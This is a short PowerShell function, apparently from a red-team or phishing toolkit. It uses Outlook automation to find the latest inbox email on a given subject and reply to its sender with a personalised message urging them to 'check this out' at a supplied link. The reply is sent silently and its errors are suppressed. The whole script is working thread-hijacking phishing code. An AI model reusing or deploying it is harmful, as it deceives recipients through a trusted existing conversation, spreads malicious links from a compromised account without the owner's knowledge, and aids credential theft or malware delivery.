function ReplyP ($Subject, $URL) {

	try {

		# Instance of Outlook
		$outlook = new-object -comobject outlook.application
		$namespace = $outlook.GetNameSpace("MAPI")

		# Get Inbox
		$folder = $namespace.GetDefaultFolder(6)

		# Get Inbox items
		$items = $folder.Items

		# Sort by Received Time descending
		$items.sort("ReceivedTime", $true)

		# Locate 1st message mactching our search criteria.
		function FindMsg($Subject) {

			# Loop through folder items, and return 1st match where subject contains $targetSubject
			ForEach ($item in $items) {

				# If we have a match, break out of loop and return MailItem object.
				if ($item.subject -match $Subject) {
					return $item
				}
			}
		}

		# # Find a message containing our desired subject
		$message = FindMsg $Subject

		# Split name into array
		$Sender_Full_Name = $message.senderName -Split " "

		# Grab first name of Sender, with a space delimiter. 
		$Sender_First_Name = $Sender_Full_Name[0]

		# Create our targeted message.
		$content =  "<p>
		" + $Sender_First_Name + ",<br /><br />
		I had another idea regarding the " + $Subject + ",
		check <a href='" + $URL + "'> this <a/> out!
		</p>
		<br /> <br />
		<hr />
		"

		# Create a reply
		$reply = $message.Reply()
		
		# Set content to HTML, prepend with our targeted message.
		$reply.HTMLBody = $content +  $message.body
		
		# Send silenly, by piping to Out-Null
		$reply.Send() | Out-Null

	}

	catch {}
}
